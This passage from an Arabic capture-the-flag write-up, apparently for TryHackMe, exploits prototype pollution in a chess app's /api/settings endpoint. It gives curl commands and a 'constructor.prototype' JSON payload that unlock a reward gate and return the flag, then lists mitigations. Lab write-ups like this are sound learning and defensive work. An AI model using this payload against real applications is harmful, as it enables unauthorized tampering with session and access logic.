### 2. استغلال Prototype Pollution عبر /api/settings

- تُرسل تفضيلات ببيانات JSON تتضمن حقلاً مسموماً في سلسلة النموذج الأولي:

```bash
curl -s -X POST http://10.48.138.51:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"config":true}}}'
```

- الجسم المرسل:

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180,
  "constructor": {
    "prototype": {
      "config": true
    }
  }
}
```

- المبدأ: الدمج غير الآمن لمدخلات JSON يسمح بتلويث السلسلة النموذجية عبر `constructor.prototype`، ما يجعل خاصية `config` متاحة للكائنات التي يعتمد عليها منطق الجلسة لتفعيل بوابة المكافأة.
- تنبيه عملي: تجنّب حمولة متداخلة مثل `config: { unlocked: true }` إذا أدت إلى recursion أو stack overflow. الحمولة الناجحة هنا تستخدم قيمة بدائية مسطحة: `config: true`.

### 3. إعادة إرسال حركة الكش مات واسترجاع العلم

- بعد تلويث النموذج الأولي بنجاح، تُرسل الحركة الفائزة مجدداً:

```bash
curl -s -X POST http://10.48.138.51:3000/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

- عند تجاوز البوابة، تعود الاستجابة المرتبطة بحالة `checkmate` متضمنة العلم. أُدخل العلم داخل TryHackMe وقُبلت الإجابة.

## الدروس الأمنية

- دمج JSON القادم من المستخدم دون تصفية مفاتيح مثل `__proto__` و`constructor` و`prototype` يفتح الباب أمام Prototype Pollution، ما يغيّر سلوك التطبيق عالمياً عبر السلسلة النموذجية.
- لتخفيف المخاطر:
  - تصفية المفاتيح الحساسة قبل أي عملية merge أو deep merge.
  - استخدام كائنات بلا نموذج أولي مثل `Object.create(null)` للتهيئات.
  - تجنّب الكشف عن خصائص داخلية حساسة في رسائل الخطأ.
  - إضافة اختبارات وحدات للتحقق من ثبات منطق الجلسة أمام مدخلات غير موثوقة.
